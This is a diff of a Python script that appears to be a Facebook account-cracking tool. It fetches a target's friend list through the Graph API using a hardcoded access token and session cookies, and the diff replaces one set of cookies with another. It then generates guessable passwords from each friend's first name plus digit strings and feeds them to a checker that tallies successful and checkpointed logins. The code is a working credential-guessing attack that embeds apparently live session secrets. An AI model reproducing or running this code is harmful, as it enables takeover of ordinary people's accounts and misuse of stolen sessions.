@@ -35,7 +35,7 @@ z,total,ok,cp=0,0,0,0
 
 def get(user):
 	try:
-		url = requests.get('https://graph.facebook.com/{}'.format(user),params={'access_token': 'EAABwzLixnjYBO8aDgnZCXTXnwv91swARorjXxPtRfKOrqGejLbbgd6SXDN5RzrysOqQavJjCIrvPZB0FFCMJdZCJHUec6ZA8e7qQhLFodPKlJr9CXwb8MHZCzISXi4od26Ky1HNk6P1CpOBX6vgNY16JZB7CpfcEdoYDRTgmdZCWWWvhLdy53eCoZBuBtQBhUbQw3jgZD','fields': "friends"},headers={"user-agent": user_agent.generate_user_agent()},cookies={'cookies':'datr=pALzZu-V7Kmofh6pn4aE4gaO; sb=pALzZgYoqZzDbd5mGq8Is4RX; m_pixel_ratio=2.75; locale=ar_AR; wd=393x766; c_user=61566287014744; fr=0MckCk2Ycj0kzLazD.AWX4f9Ha0m4EGtHZrggT9eLLtY8.Bm8wKk..AAA.0.0.Bm8wMW.AWW55RXeq94; xs=26%3AxncGHQ36q2rtnQ%3A2%3A1727202070%3A-1%3A-1; m_page_voice=61566287014744; ps_l=1; ps_n=1'}).json()
+		url = requests.get('https://graph.facebook.com/{}'.format(user),params={'access_token': 'EAABwzLixnjYBO8aDgnZCXTXnwv91swARorjXxPtRfKOrqGejLbbgd6SXDN5RzrysOqQavJjCIrvPZB0FFCMJdZCJHUec6ZA8e7qQhLFodPKlJr9CXwb8MHZCzISXi4od26Ky1HNk6P1CpOBX6vgNY16JZB7CpfcEdoYDRTgmdZCWWWvhLdy53eCoZBuBtQBhUbQw3jgZD','fields': "friends"},headers={"user-agent": user_agent.generate_user_agent()},cookies={'cookies':'datr=ngTzZmui-wI5b-WG5PiyC2n0; sb=ngTzZj3jnDZFXrWbeKqDKBKq; m_pixel_ratio=2.75; wd=393x766; c_user=100092075492893; fr=0TkW3Jx0QDw9IjcL8.AWWxRXSg2QSwWMCVhbIsLdlZaHo.Bm8wSe..AAA.0.0.Bm8wS4.AWXJJJsOwOQ; xs=34%3ADmp8feGpUt-97Q%3A2%3A1727202489%3A-1%3A6642; m_page_voice=100092075492893'}).json()
 		for mm in url['friends']['data']:
 			ko = (mm['id']+'|'+mm['name'])
 			if ko in fid:
@@ -74,12 +74,12 @@ def password():
 		for kk in fid:
 			idf,nmf = kk.split('|')[0],kk.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
-			pwv = [nmf,frs+frs,frs+' '+frs,frs+'123',frs+'12345',frs+'123456',frs+'123456789',frs+'1234567890',frs+'1234512345',frs+'١٢٣']
+			pwv = [nmf,frs+frs,frs+' '+frs,frs+'123',frs+'12345',frs+'123456',frs+'123456789',frs+'1234567890',frs+'1234512345',frs+'1122']
 			kp.submit(checker,idf,pwv)
 
 def checker(idf,pwv):
 	global total,ok,cp
-	print('\r\033[2;36mϟ \033[1;97m[\033[2;36m 🇪🇬 المصري\033[1;97m \033[2;36mاسير\033[2;32m] \033[1;97m~ \033[1;97m[\033[2;32mOK \033[1;97m- \033[1;31mCP\033[1;97m] = [\033[2;32m%s\033[1;97m -\033[1;31m %s\033[1;97m] = [\033[1;33m %s/%s\033[1;97m ]'%(ok,cp,total,len(fid)),end=' ');sys.stdout.flush()
+	print('\r\033[2;36mϟ \033[1;97m[\033[2;36m🇪🇬المصري\033[1;97m☠️\033[2;36mاسير\033[2;32m] \033[1;97m~ \033[1;97m[\033[2;32mOK \033[1;97m- \033[1;31mCP\033[1;97m] = [\033[2;32m%s\033[1;97m -\033[1;31m %s\033[1;97m] = [\033[1;33m %s/%s\033[1;97m ]'%(ok,cp,total,len(fid)),end=' ');sys.stdout.flush()
 	for ps in pwv:
 		open('tt.txt','a').write(idf+'|'+ps+'\n')
 		try:
